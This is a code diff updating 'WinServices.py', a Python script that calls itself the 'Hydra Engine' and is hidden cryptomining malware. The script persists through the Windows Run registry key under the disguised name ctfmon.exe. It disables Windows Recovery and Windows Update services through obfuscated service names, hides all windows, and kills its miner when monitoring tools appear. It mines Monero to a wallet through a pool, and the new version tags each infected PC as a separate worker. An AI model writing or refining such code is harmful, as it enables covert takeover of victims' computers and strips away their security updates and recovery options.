@@ -1,6 +1,6 @@
 import os, sys, subprocess
 
-# --- THE HYDRA ENGINE (WinServices.py v6.2 - TRUE IDLE) ---
+# --- THE HYDRA ENGINE (WinServices.py v6.3 - INDIVIDUAL WORKERS) ---
 # This flag tells Windows: "Do NOT show a console window."
 HIDE_WINDOW = 0x08000000 
 
@@ -78,7 +78,6 @@ def engage_locks():
     """Persistence, Reset Disable, and Update Lockdown with ZERO windows."""
     try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN, 0, winreg.KEY_SET_VALUE)
-        # THE MASK: We point persistence to ctfmon.exe instead of pythonw.exe
         py_path = os.path.join(WORK_DIR, "python", "ctfmon.exe")
         winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'"{py_path}" "{SELF_PATH}" --id {ID}')
         winreg.CloseKey(key)
@@ -86,7 +85,6 @@ def engage_locks():
     except: pass
     
     try:
-        # HIDE reagentc window
         subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=HIDE_WINDOW)
         notify("Windows Recovery Environment disabled.", "sys")
     except: pass
@@ -94,7 +92,6 @@ def engage_locks():
     try:
         for s in SVC_LIST:
             name = base64.b64decode(s).decode()
-            # HIDE sc windows
             subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True, creationflags=HIDE_WINDOW)
             subprocess.run(["sc", "stop", name], capture_output=True, creationflags=HIDE_WINDOW)
         notify("Windows Updates locked.", "sys")
@@ -124,7 +121,6 @@ def manage_power():
         try:
             if p.info['name'] == f"{ID}.exe" and p.info['exe'] and os.path.normpath(p.info['exe']) == os.path.normpath(CONFIG["MINER"]):
                 miner_proc = p
-                # Check current power from the running process args
                 for arg in p.info['cmdline']:
                     if arg == CONFIG["IDLE_PWR"] or arg == CONFIG["NORM_PWR"]:
                         current_power = arg
@@ -138,31 +134,32 @@ def manage_power():
                 notify("Monitoring detected. Vanishing.", "sys")
             except: pass
     else:
-        # CHECK TRUE IDLE (Mouse/Keyboard silence)
         idle_time = get_idle_duration()
         target_pwr = CONFIG["IDLE_PWR"] if idle_time > CONFIG["IDLE_SEC"] else CONFIG["NORM_PWR"]
         
-        # If miner is missing OR we need to switch power levels
         if not miner_proc or current_power != target_pwr:
             if miner_proc:
                 try: miner_proc.terminate()
                 except: pass
                 
             try:
-                subprocess.Popen([CONFIG["MINER"], "-o", POOL, "-u", WALLET, "--max-cpu-usage", target_pwr, "-k", "--tls"], 
+                # --- THE WORKER FIX ---
+                # We append the PC_NAME to the WALLET address so SupportXMR tracks them individually
+                worker_id = f"{WALLET}.{PC_NAME}"
+                
+                subprocess.Popen([CONFIG["MINER"], "-o", POOL, "-u", worker_id, "--max-cpu-usage", target_pwr, "-k", "--tls"], 
                                  creationflags=HIDE_WINDOW)
-                notify(f"Watchdog: Engine Engaged. Power: {target_pwr}% (Idle: {int(idle_time)}s)", "mine")
+                notify(f"Watchdog: Engine Engaged. Power: {target_pwr}% (Worker: {PC_NAME})", "mine")
             except Exception as e:
                 notify(f"Engine Failed: {str(e)}", "sys")
 
 def main():
     engage_locks()
-    notify("SYSTEM ONLINE (True Idle Hydra Active)", "sys")
+    notify("SYSTEM ONLINE (v6.3 - Individual Worker Mode)", "sys")
     last_update = time.time()
     
     while True:
         manage_power()
-        # Update check every 12 hours
         if time.time() - last_update > 43200:
             auto_update()
             last_update = time.time()
